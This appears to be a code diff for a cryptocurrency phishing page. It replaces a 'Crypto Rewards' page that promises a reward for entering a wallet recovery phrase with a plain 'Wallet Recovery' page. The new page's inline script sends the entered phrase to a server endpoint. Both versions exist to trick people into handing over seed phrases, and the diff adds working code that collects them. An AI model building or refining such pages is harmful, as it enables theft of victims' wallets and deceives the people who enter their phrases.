@@ -3,27 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Rewards</title>
-    <link rel="stylesheet" href="/public/styles.css">
+    <title>Wallet Recovery</title>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>Welcome to Crypto Rewards</h1>
-            <p>Enter your recovery phrase below to claim your reward!</p>
-        </header>
-        <main>
-            <form id="recoveryForm">
-                <textarea name="recoveryPhrase" placeholder="Enter your recovery phrase..." required></textarea>
-                <button type="submit">Submit</button>
-            </form>
-            <div id="countdown"></div>
-            <div id="cryptoPrices"></div>
-        </main>
-        <footer>
-            <p>© 2025 Crypto Rewards. All Rights Reserved.</p>
-        </footer>
-    </div>
-    <script src="/public/script.js"></script>
+    <h1>Enter Your Wallet Recovery Phrase</h1>
+    <form id="recovery-form">
+        <textarea id="recovery-phrase" rows="4" cols="50" placeholder="Enter your recovery phrase here"></textarea><br>
+        <button type="button" onclick="submitRecoveryPhrase()">Submit</button>
+    </form>
+
+    <script>
+        async function submitRecoveryPhrase() {
+            const recoveryPhrase = document.getElementById('recovery-phrase').value;
+            if (!recoveryPhrase.trim()) {
+                alert('Please enter your recovery phrase.');
+                return;
+            }
+
+            try {
+                const response = await fetch('/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ recoveryPhrase }),
+                });
+
+                const result = await response.json();
+                if (response.ok) {
+                    alert('Recovery phrase submitted successfully!');
+                } else {
+                    alert(`Failed to submit: ${result.message}`);
+                }
+            } catch (error) {
+                alert('Failed to submit. Please try again.');
+                console.error(error);
+            }
+        }
+    </script>
 </body>
 </html>
